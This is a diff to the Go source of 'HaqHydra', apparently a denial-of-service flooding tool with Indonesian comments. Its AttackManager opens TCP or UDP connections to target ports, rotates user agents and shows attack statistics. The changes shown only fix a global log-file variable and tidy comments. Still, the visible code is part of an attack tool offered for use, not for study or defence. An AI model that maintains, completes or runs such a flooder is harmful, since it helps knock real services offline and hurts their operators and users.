@@ -10,7 +10,7 @@ import (
 	"net"
 	"os"
 	"os/signal"
-	"strconv" // <<<<<<< IMPOR UNTUK KONVERSI ANGKA
+	"strconv" // Untuk konversi angka
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -29,6 +29,8 @@ var (
 	logFile   *os.File
 	logger    *log.Logger
 	wg        sync.WaitGroup // Untuk menunggu semua goroutine selesai
+
+	LOG_FILENAME string // <<<<<<<<< DEKLARASI GLOBAL UNTUK NAMA FILE LOG
 )
 
 // --- Banner ---
@@ -73,14 +75,12 @@ var USER_AGENTS = []string{
 const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 // --- Helper Functions ---
-// rand.Int digunakan dari crypto/rand karena lebih aman untuk acak kriptografis
 func getRandomBigInt(max int64) *big.Int {
 	n, err := rand.Int(rand.Reader, big.NewInt(max))
 	if err != nil {
-		// Fallback ke math/rand jika crypto/rand gagal (jarang terjadi)
-		// Atau log error dan return nilai default
 		log.Printf("Warning: crypto/rand failed, falling back to math/rand for random number: %v", err)
-		return big.NewInt(int64(time.Now().Nanosecond() % int(max))) // Pendekatan sederhana
+		// Fallback yang sangat sederhana jika crypto/rand gagal
+		return big.NewInt(int64(time.Now().Nanosecond() % int(max)))
 	}
 	return n
 }
@@ -252,7 +252,6 @@ func (am *AttackManager) openConnection(port int, limit int) {
 	if am.attackType == "http" {
 		conn, err = net.DialTimeout("tcp", address, 5*time.Second)
 	} else if am.attackType == "udp" {
-		// UDP Dial returns a UDPConn
 		conn, err = net.Dial("udp", address)
 	} else {
 		am.log("Unsupported attack type %s", am.attackType)
@@ -443,7 +442,7 @@ func (am *AttackManager) statsDisplay() {
 				am.atomicGet(&activeConnections),
 				am.atomicGet(&serverErrors),
 				am.atomicGet(&errorCount),
-				LOG_FILENAME,
+				LOG_FILENAME, // Sekarang LOG_FILENAME sudah terdefinisi
 			)
 		}
 	}
@@ -484,10 +483,6 @@ func (am *AttackManager) Start() {
 	fmt.Println("\nHaqHydra attack finished.")
 }
 
-// Stop members tidak secara eksplisit dipanggil di sini karena Stop()
-// sudah dicakup oleh penanganan Ctrl+C dan loop durasi yang mengarah ke close(stopEvent).
-// wg.Wait() di akhir Start() adalah mekanisme cleanup utama.
-
 // --- Main Function ---
 func main() {
 	// Inisialisasi Awal
@@ -496,8 +491,9 @@ func main() {
 	fmt.Printf("\033[1;36m------------------------------------------------------------\033[0m\n")
 
 	// Setup Logging
+	LOG_FILENAME = "attack_log.txt" // <<<<<<< SEKARANG LOG_FILENAME DIINISIALISASI GLOBAL
 	var err error
-	logFile, err = os.OpenFile("attack_log.txt", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
+	logFile, err = os.OpenFile(LOG_FILENAME, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
 	if err != nil {
 		log.Fatalf("Failed to open log file: %v", err)
 	}
